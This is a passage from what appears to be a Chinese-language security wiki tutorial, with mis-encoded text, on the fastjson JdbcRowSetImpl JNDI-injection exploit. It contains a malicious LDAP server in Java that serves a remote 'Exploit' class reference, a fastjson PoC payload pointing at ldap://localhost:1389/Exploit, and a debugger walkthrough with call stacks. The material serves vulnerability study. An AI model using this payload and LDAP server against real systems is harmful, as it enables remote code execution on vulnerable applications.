            config<span class="token punctuation">.</span><span class="token function">setListenerConfigs</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">InMemoryListenerConfig</span><span class="token punctuation">(</span>
                    <span class="token string">&quot;listen&quot;</span><span class="token punctuation">,</span>
                    <span class="token class-name">InetAddress</span><span class="token punctuation">.</span><span class="token function">getByName</span><span class="token punctuation">(</span><span class="token string">&quot;0.0.0.0&quot;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                    port<span class="token punctuation">,</span>
                    <span class="token class-name">ServerSocketFactory</span><span class="token punctuation">.</span><span class="token function">getDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                    <span class="token class-name">SocketFactory</span><span class="token punctuation">.</span><span class="token function">getDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                    <span class="token punctuation">(</span><span class="token class-name">SSLSocketFactory</span><span class="token punctuation">)</span> <span class="token class-name">SSLSocketFactory</span><span class="token punctuation">.</span><span class="token function">getDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

            config<span class="token punctuation">.</span><span class="token function">addInMemoryOperationInterceptor</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">OperationInterceptor</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">InMemoryDirectoryServer</span> ds <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InMemoryDirectoryServer</span><span class="token punctuation">(</span>config<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">&quot;Listening on 0.0.0.0:&quot;</span> <span class="token operator">+</span> port<span class="token punctuation">)</span><span class="token punctuation">;</span>
            ds<span class="token punctuation">.</span><span class="token function">startListening</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token punctuation">}</span>
        <span class="token keyword">catch</span> <span class="token punctuation">(</span> <span class="token class-name">Exception</span> e <span class="token punctuation">)</span> <span class="token punctuation">{</span>
            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">class</span> <span class="token class-name">OperationInterceptor</span> <span class="token keyword">extends</span> <span class="token class-name">InMemoryOperationInterceptor</span> <span class="token punctuation">{</span>

        <span class="token keyword">private</span> <span class="token class-name">URL</span> codebase<span class="token punctuation">;</span>


        <span class="token doc-comment comment">/**
         *
         */</span>
        <span class="token keyword">public</span> <span class="token class-name">OperationInterceptor</span> <span class="token punctuation">(</span> <span class="token class-name">URL</span> cb <span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>codebase <span class="token operator">=</span> cb<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>


        <span class="token doc-comment comment">/**
         * <span class="token punctuation">{</span><span class="token keyword">@inheritDoc</span><span class="token punctuation">}</span>
         *
         * <span class="token keyword">@see</span> <span class="token reference"><span class="token namespace">com<span class="token punctuation">.</span>unboundid<span class="token punctuation">.</span>ldap<span class="token punctuation">.</span>listener<span class="token punctuation">.</span>interceptor<span class="token punctuation">.</span></span><span class="token class-name">InMemoryOperationInterceptor</span><span class="token punctuation">#</span><span class="token function">processSearchResult</span><span class="token punctuation">(</span><span class="token namespace">com<span class="token punctuation">.</span>unboundid<span class="token punctuation">.</span>ldap<span class="token punctuation">.</span>listener<span class="token punctuation">.</span>interceptor<span class="token punctuation">.</span></span><span class="token class-name">InMemoryInterceptedSearchResult</span><span class="token punctuation">)</span></span>
         */</span>
        <span class="token annotation punctuation">@Override</span>
        <span class="token keyword">public</span> <span class="token keyword">void</span> processSearchResult <span class="token punctuation">(</span> <span class="token class-name">InMemoryInterceptedSearchResult</span> result <span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token class-name">String</span> base <span class="token operator">=</span> result<span class="token punctuation">.</span><span class="token function">getRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getBaseDN</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">Entry</span> e <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Entry</span><span class="token punctuation">(</span>base<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">try</span> <span class="token punctuation">{</span>
                <span class="token function">sendResult</span><span class="token punctuation">(</span>result<span class="token punctuation">,</span> base<span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            <span class="token keyword">catch</span> <span class="token punctuation">(</span> <span class="token class-name">Exception</span> e1 <span class="token punctuation">)</span> <span class="token punctuation">{</span>
                e1<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>

        <span class="token punctuation">}</span>


        <span class="token keyword">protected</span> <span class="token keyword">void</span> sendResult <span class="token punctuation">(</span> <span class="token class-name">InMemoryInterceptedSearchResult</span> result<span class="token punctuation">,</span> <span class="token class-name">String</span> base<span class="token punctuation">,</span> <span class="token class-name">Entry</span> e <span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">LDAPException</span><span class="token punctuation">,</span> <span class="token class-name">MalformedURLException</span> <span class="token punctuation">{</span>
            <span class="token class-name">URL</span> turl <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>codebase<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>codebase<span class="token punctuation">.</span><span class="token function">getRef</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token char">&#39;.&#39;</span><span class="token punctuation">,</span> <span class="token char">&#39;/&#39;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token string">&quot;.class&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">&quot;Send LDAP reference result for &quot;</span> <span class="token operator">+</span> base <span class="token operator">+</span> <span class="token string">&quot; redirecting to &quot;</span> <span class="token operator">+</span> turl<span class="token punctuation">)</span><span class="token punctuation">;</span>
            e<span class="token punctuation">.</span><span class="token function">addAttribute</span><span class="token punctuation">(</span><span class="token string">&quot;javaClassName&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;Exploit&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">String</span> cbstring <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>codebase<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">int</span> refPos <span class="token operator">=</span> cbstring<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token char">&#39;#&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span> refPos <span class="token operator">&gt;</span> <span class="token number">0</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>
                cbstring <span class="token operator">=</span> cbstring<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> refPos<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            e<span class="token punctuation">.</span><span class="token function">addAttribute</span><span class="token punctuation">(</span><span class="token string">&quot;javaCodeBase&quot;</span><span class="token punctuation">,</span> cbstring<span class="token punctuation">)</span><span class="token punctuation">;</span>
            e<span class="token punctuation">.</span><span class="token function">addAttribute</span><span class="token punctuation">(</span><span class="token string">&quot;objectClass&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;javaNamingReference&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            e<span class="token punctuation">.</span><span class="token function">addAttribute</span><span class="token punctuation">(</span><span class="token string">&quot;javaFactory&quot;</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>codebase<span class="token punctuation">.</span><span class="token function">getRef</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            result<span class="token punctuation">.</span><span class="token function">sendSearchEntry</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>
            result<span class="token punctuation">.</span><span class="token function">setResult</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">LDAPResult</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token class-name">ResultCode</span><span class="token punctuation">.</span><span class="token constant">SUCCESS</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>Exploit ç±»ä¸å˜ï¼Œæ›´æ”¹ poc åè®®ã€‚</p><div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code><span class="token keyword">package</span> <span class="token namespace">demo</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span></span><span class="token class-name">JSON</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>parser<span class="token punctuation">.</span></span><span class="token class-name">Feature</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">JdbcRowSetImplPoc</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> argv<span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token class-name">String</span> payload <span class="token operator">=</span> <span class="token string">&quot;{\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;ldap://localhost:1389/Exploit\&quot;, \&quot;autoCommit\&quot;:true}&quot;</span><span class="token punctuation">;</span>
        <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>payload<span class="token punctuation">,</span> <span class="token class-name">Feature<span class="token punctuation">.</span>SupportNonPublicField</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// JSON.parse(payload); // è¿™æ ·ä¹Ÿè¡Œ</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>â€‹<img src="/SecWikiPublic/secwiki/assets/img/image-20240418144606-qpu87oe.0022a6e1.png" alt="image" loading="lazy">â€‹</p><p>å‡ºé”™ï¼Œæ”¹ä¸€ä¸‹ ldapserver çš„å®ç°è¯·æ±‚ç±»åå³å¯ã€‚</p><p>â€‹<img src="/SecWikiPublic/secwiki/assets/img/image-20240418145825-zpm6as7.2e9de43d.png" alt="image" loading="lazy">â€‹</p><p>â€‹<img src="/SecWikiPublic/secwiki/assets/img/image-20240418150145-mnkpciu.8763851d.png" alt="image" loading="lazy">â€‹</p><ul><li>â€‹<code>this.codebase.getRef()</code>â€‹ï¼š<code>getRef()</code>â€‹ æ–¹æ³•ç”¨äºè·å– URL ä¸­çš„å¼•ç”¨éƒ¨åˆ†ï¼ˆå³ URL ä¸­çš„ <code>#</code>â€‹ å·åé¢çš„éƒ¨åˆ†</li><li>â€‹<code>replace(&#39;.&#39;, &#39;/&#39;)</code>â€‹ï¼šè¿™ä¸€æ­¥æ˜¯å°†å¼•ç”¨éƒ¨åˆ†ä¸­çš„ <code>.</code>â€‹ å­—ç¬¦æ›¿æ¢ä¸º <code>/</code>â€‹ å­—ç¬¦ã€‚åœ¨ Java ç±»æ–‡ä»¶çš„ URL è¡¨ç¤ºä¸­ï¼ŒåŒ…åé€šå¸¸ç”¨è·¯å¾„è¡¨ç¤ºï¼Œå› æ­¤éœ€è¦å°† <code>.</code>â€‹ æ›¿æ¢ä¸º <code>/</code>â€‹</li><li>â€‹<code>concat(&quot;.class&quot;)</code>â€‹ï¼šåœ¨ Java ä¸­ï¼Œç±»æ–‡ä»¶çš„åç§°é€šå¸¸ä»¥ <code>.class</code>â€‹ ä½œä¸ºæ‰©å±•åã€‚å› æ­¤ï¼Œè¿™ä¸€æ­¥æ˜¯å°†ç±»åå­—ç¬¦ä¸²åé¢è¿½åŠ  <code>.class</code>â€‹ æ‰©å±•å</li></ul><h4 id="è°ƒè¯•åˆ†æ-1" tabindex="-1"><a class="header-anchor" href="#è°ƒè¯•åˆ†æ-1"><span>è°ƒè¯•åˆ†æ</span></a></h4><p>è¿™é‡Œåªåˆ†æ fastjson è§¦å‘ com.sun.rowset.JdbcRowSetImpl è¿™æ¡ JNDI æ³¨å…¥åˆ©ç”¨é“¾çš„è¿‡ç¨‹ã€‚</p><p>å‰é¢çš„å‡½æ•°è°ƒç”¨è¿‡ç¨‹å’ŒåŸºäº TemplateImpl çš„è°ƒè¯•åˆ†æå‡ ä¹æ˜¯ä¸€æ ·çš„ï¼Œåªçœ‹ä¸‹åŒºåˆ«çš„åœ°æ–¹ã€‚</p><p>è°ƒç”¨ <code>scanSymbol()</code>â€‹ å‡½æ•°æ‰«æåˆ° <code>com.sun.rowset.JdbcRowSetImpl</code>â€‹ ç±»åï¼Œå†è°ƒç”¨ <code>TypeUtils.loadClass()</code>â€‹ å‡½æ•°å°†è¯¥ç±»åŠ è½½è¿›æ¥ã€‚</p><p>â€‹<img src="/SecWikiPublic/secwiki/assets/img/image-20240418152937-fny6ckb.f6d3ba40.png" alt="image" loading="lazy">â€‹</p><div class="language-xml line-numbers-mode" data-ext="xml" data-title="xml"><pre class="language-xml"><code>parseObject:322, DefaultJSONParser (com.alibaba.fastjson.parser)
parse:1327, DefaultJSONParser (com.alibaba.fastjson.parser)
parse:1293, DefaultJSONParser (com.alibaba.fastjson.parser)
parse:137, JSON (com.alibaba.fastjson)
parse:193, JSON (com.alibaba.fastjson)
main:9, JdbcRowSetImplPoc (demo)
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>å¾€ä¸‹è°ƒè¯•ï¼Œè°ƒç”¨äº† <code>FastjsonASMDeserializer.deserialze()</code>â€‹ å‡½æ•°å¯¹è¯¥ç±»è¿›è¡Œååºåˆ—åŒ–æ“ä½œã€‚</p><p>â€‹<img src="/SecWikiPublic/secwiki/assets/img/image-20240418153230-s2xlncj.fe1f3b37.png" alt="image" loading="lazy">â€‹</p><p>ç»§ç»­å¾€ä¸‹è°ƒè¯•ï¼Œå°±æ˜¯ ASM æœºåˆ¶ç”Ÿæˆçš„ä¸´æ—¶ä»£ç äº†ï¼Œè¿™äº›ä»£ç æ˜¯ä¸‹ä¸äº†æ–­ç‚¹ã€ä¹Ÿçœ‹ä¸åˆ°ï¼Œç›´æ¥ç»§ç»­å¾€ä¸‹è°ƒè¯•å³å¯ã€‚</p><blockquote><p>ASM æ˜¯ä¸€ä¸ª Java å­—èŠ‚ç æ“æ§æ¡†æ¶ã€‚å®ƒèƒ½è¢«ç”¨æ¥åŠ¨æ€ç”Ÿæˆç±»æˆ–è€…å¢å¼ºæ—¢æœ‰ç±»çš„åŠŸèƒ½ã€‚ASM å¯ä»¥ç›´æ¥äº§ç”ŸäºŒè¿›åˆ¶ class æ–‡ä»¶ï¼Œä¹Ÿå¯ä»¥åœ¨ç±»è¢«åŠ è½½å…¥ Java è™šæ‹Ÿæœºä¹‹å‰åŠ¨æ€æ”¹å˜ç±»è¡Œä¸ºã€‚</p><p>Java class è¢«å­˜å‚¨åœ¨ä¸¥æ ¼æ ¼å¼å®šä¹‰çš„ <code>.class</code>â€‹ æ–‡ä»¶é‡Œï¼Œè¿™äº›ç±»æ–‡ä»¶æ‹¥æœ‰è¶³å¤Ÿçš„å…ƒæ•°æ®æ¥è§£æç±»ä¸­çš„æ‰€æœ‰å…ƒç´ ï¼šç±»åç§°ã€æ–¹æ³•ã€å±æ€§ä»¥åŠ Java å­—èŠ‚ç ï¼ˆæŒ‡ä»¤ï¼‰ã€‚ASM ä»ç±»æ–‡ä»¶ä¸­è¯»å…¥ä¿¡æ¯åï¼Œèƒ½å¤Ÿæ”¹å˜ç±»è¡Œä¸ºï¼Œåˆ†æç±»ä¿¡æ¯ï¼Œç”šè‡³èƒ½å¤Ÿæ ¹æ®ç”¨æˆ·è¦æ±‚ç”Ÿæˆæ–°ç±»ã€‚</p></blockquote><p>æˆ–è€…æ ¹æ®å‰é¢çš„åˆ†æåœ¨ <code>com.alibaba.fastjson.parser.deserializer.DefaultFieldDeserializer#parseField</code>â€‹ --&gt; <code>value = fieldValueDeserilizer.deserialze(parser, fieldType, fieldInfo.name);</code>â€‹ --&gt;</p><p>â€‹<code>com.alibaba.fastjson.parser.deserializer.FieldDeserializer#setValue</code>â€‹ å¤„ä¸‹ä¸€ä¸ªæ–­ç‚¹ã€‚</p><p>â€‹<img src="/SecWikiPublic/secwiki/assets/img/image-20240418161910-2lc6gco.5a85bfa0.png" alt="image" loading="lazy">â€‹</p><p>ç”±äº Poc è®¾ç½®äº† <code>dataSourceName</code>â€‹ é”®å€¼å’Œ <code>autoCommit</code>â€‹ é”®å€¼ï¼Œå› æ­¤åœ¨ JdbcRowSetImpl ä¸­çš„ <code>setDataSourceName()</code>â€‹ å’Œ <code>setAutoCommit()</code>â€‹ å‡½æ•°éƒ½ä¼šè¢«è°ƒç”¨ï¼Œå› ä¸ºå®ƒä»¬å‡æ»¡è¶³å‰é¢è¯´åˆ°çš„ Fastjson åœ¨ååºåˆ—åŒ–æ—¶ä¼šè‡ªåŠ¨è°ƒç”¨çš„ setter æ–¹æ³•çš„ç‰¹å¾ã€‚</p><p>å…ˆæ˜¯è°ƒè¯•åˆ°äº† <code>com.sun.rowset.JdbcRowSetImpl#setDataSourceName</code>â€‹â€‹ å‡½æ•°ï¼Œå°† dataSourceName å€¼è®¾ç½®ä¸ºç›®æ ‡ RMI æœåŠ¡çš„åœ°å€ã€‚</p><p>â€‹<img src="/SecWikiPublic/secwiki/assets/img/image-20240418161717-exo7y0w.e73174ca.png" alt="image" loading="lazy">â€‹</p><p>â€‹<img src="/SecWikiPublic/secwiki/assets/img/image-20240418161804-rwuz9uj.b7d29886.png" alt="image" loading="lazy">â€‹</p><p>æ¥ç€è°ƒç”¨åˆ° <code>com.sun.rowset.JdbcRowSetImpl#setAutoCommit</code>â€‹ å‡½æ•°ï¼ˆæ–­ç‚¹ï¼‰ï¼Œè®¾ç½® autoCommit å€¼ï¼Œå…¶ä¸­è°ƒç”¨äº† <code>com.sun.rowset.JdbcRowSetImpl#connect</code>â€‹ å‡½æ•°ã€‚</p><p>â€‹<img src="/SecWikiPublic/secwiki/assets/img/image-20240418162412-cpuaswu.a2629813.png" alt="image" loading="lazy">â€‹</p><p>å¯ä»¥çœ‹åˆ° JNDI æ³¨å…¥çš„ä»£ç å³ <code>InitialContext.lookup()</code>â€‹â€‹ï¼Œå¹¶ä¸”å…¶å‚æ•°æ˜¯è°ƒç”¨ <code>this.getDataSourceName()</code>â€‹â€‹ è·å–çš„ã€å³åœ¨å‰é¢ <code>setDataSourceName()</code>â€‹â€‹ å‡½æ•°ä¸­è®¾ç½®çš„å€¼ï¼Œå› æ­¤ lookup å‚æ•°å¤–éƒ¨å¯æ§ï¼Œå¯¼è‡´å­˜åœ¨ JNDI æ³¨å…¥æ¼æ´ã€‚æœ€åï¼ŒæˆåŠŸåˆ©ç”¨ JNDI æ³¨å…¥è§¦å‘ Fastjson ååºåˆ—åŒ–æ¼æ´ã€è¾¾åˆ°ä»»æ„å‘½ä»¤æ‰§è¡Œæ•ˆæœã€‚</p><p>ã€<strong>è°ƒç”¨æ ˆå¦‚ä¸‹ã€‘</strong></p><div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code>connect<span class="token operator">:</span><span class="token number">624</span><span class="token punctuation">,</span> <span class="token class-name">JdbcRowSetImpl</span> <span class="token punctuation">(</span>com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>rowset<span class="token punctuation">)</span>
setAutoCommit<span class="token operator">:</span><span class="token number">4067</span><span class="token punctuation">,</span> <span class="token class-name">JdbcRowSetImpl</span> <span class="token punctuation">(</span>com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>rowset<span class="token punctuation">)</span>
invoke0<span class="token operator">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token class-name">NativeMethodAccessorImpl</span> <span class="token punctuation">(</span>sun<span class="token punctuation">.</span>reflect<span class="token punctuation">)</span>
invoke<span class="token operator">:</span><span class="token number">62</span><span class="token punctuation">,</span> <span class="token class-name">NativeMethodAccessorImpl</span> <span class="token punctuation">(</span>sun<span class="token punctuation">.</span>reflect<span class="token punctuation">)</span>
invoke<span class="token operator">:</span><span class="token number">43</span><span class="token punctuation">,</span> <span class="token class-name">DelegatingMethodAccessorImpl</span> <span class="token punctuation">(</span>sun<span class="token punctuation">.</span>reflect<span class="token punctuation">)</span>
invoke<span class="token operator">:</span><span class="token number">483</span><span class="token punctuation">,</span> <span class="token class-name">Method</span> <span class="token punctuation">(</span>java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">)</span>
setValue<span class="token operator">:</span><span class="token number">96</span><span class="token punctuation">,</span> <span class="token class-name">FieldDeserializer</span> <span class="token punctuation">(</span>com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>parser<span class="token punctuation">.</span>deserializer<span class="token punctuation">)</span>
parseField<span class="token operator">:</span><span class="token number">83</span><span class="token punctuation">,</span> <span class="token class-name">DefaultFieldDeserializer</span> <span class="token punctuation">(</span>com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>parser<span class="token punctuation">.</span>deserializer<span class="token punctuation">)</span>
parseField<span class="token operator">:</span><span class="token number">773</span><span class="token punctuation">,</span> <span class="token class-name">JavaBeanDeserializer</span> <span class="token punctuation">(</span>com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>parser<span class="token punctuation">.</span>deserializer<span class="token punctuation">)</span>
deserialze<span class="token operator">:</span><span class="token number">600</span><span class="token punctuation">,</span> <span class="token class-name">JavaBeanDeserializer</span> <span class="token punctuation">(</span>com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>parser<span class="token punctuation">.</span>deserializer<span class="token punctuation">)</span>
parseRest<span class="token operator">:</span><span class="token number">922</span><span class="token punctuation">,</span> <span class="token class-name">JavaBeanDeserializer</span> <span class="token punctuation">(</span>com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>parser<span class="token punctuation">.</span>deserializer<span class="token punctuation">)</span>
deserialze<span class="token operator">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token class-name">FastjsonASMDeserializer_1_JdbcRowSetImpl</span> <span class="token punctuation">(</span>com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>parser<span class="token punctuation">.</span>deserializer<span class="token punctuation">)</span>
deserialze<span class="token operator">:</span><span class="token number">184</span><span class="token punctuation">,</span> <span class="token class-name">JavaBeanDeserializer</span> <span class="token punctuation">(</span>com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>parser<span class="token punctuation">.</span>deserializer<span class="token punctuation">)</span>
parseObject<span class="token operator">:</span><span class="token number">368</span><span class="token punctuation">,</span> <span class="token class-name">DefaultJSONParser</span> <span class="token punctuation">(</span>com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>parser<span class="token punctuation">)</span>
parse<span class="token operator">:</span><span class="token number">1327</span><span class="token punctuation">,</span> <span class="token class-name">DefaultJSONParser</span> <span class="token punctuation">(</span>com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>parser<span class="token punctuation">)</span>
parse<span class="token operator">:</span><span class="token number">1293</span><span class="token punctuation">,</span> <span class="token class-name">DefaultJSONParser</span> <span class="token punctuation">(</span>com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>parser<span class="token punctuation">)</span>
parse<span class="token operator">:</span><span class="token number">137</span><span class="token punctuation">,</span> <span class="token constant">JSON</span> <span class="token punctuation">(</span>com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">)</span>
parse<span class="token operator">:</span><span class="token number">193</span><span class="token punctuation">,</span> <span class="token constant">JSON</span> <span class="token punctuation">(</span>com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">)</span>
main<span class="token operator">:</span><span class="token number">9</span><span class="token punctuation">,</span> <span class="token class-name">JdbcRowSetImplPoc</span> <span class="token punctuation">(</span>demo<span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="å·¥å…·" tabindex="-1"><a class="header-anchor" href="#å·¥å…·"><span>å·¥å…·</span></a></h2><blockquote><ul><li><a href="https://github.com/wyzxxz/jndi_tool" target="_blank" rel="noopener noreferrer">wyzxxz/jndi_tool: JNDI æœåŠ¡åˆ©ç”¨å·¥å…· RMI/LDAPï¼Œæ”¯æŒéƒ¨åˆ†åœºæ™¯å›æ˜¾ã€å†…å­˜ shellï¼Œé«˜ç‰ˆæœ¬ JDK åœºæ™¯ä¸‹åˆ©ç”¨ç­‰ï¼Œfastjson rce å‘½ä»¤æ‰§è¡Œï¼Œlog4j rce å‘½ä»¤æ‰§è¡Œ æ¼æ´æ£€æµ‹è¾…åŠ©å·¥å…· (github.com)<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" 